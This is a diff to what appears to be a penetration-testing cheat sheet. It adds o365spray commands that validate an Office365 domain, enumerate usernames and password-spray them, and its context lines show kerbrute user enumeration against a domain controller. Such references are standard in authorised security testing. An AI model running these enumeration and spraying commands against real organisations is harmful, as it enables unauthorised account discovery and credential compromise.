@@ -1095,6 +1095,14 @@ $ ./username-anarchy -i listoffirstandlastnames.txt
 $ ./kerbrute_linux_amd64 userenum --dc <DC IP address> --domain <Domain Name> names.txt
 ```
 
+- Office365 Password Spray
+
+```
+python3 o365spray.py --validate --domain <domain.tld>
+python3 o365spray.py --enum -U usernames.txt --domain <domain.tld>
+python3 o365spray.py --spray -U usersnamesfound.txt -p '<password>' --count 1 --lockout 1 --domain <domain.tld>
+```
+
 - Netexec
 
 ```
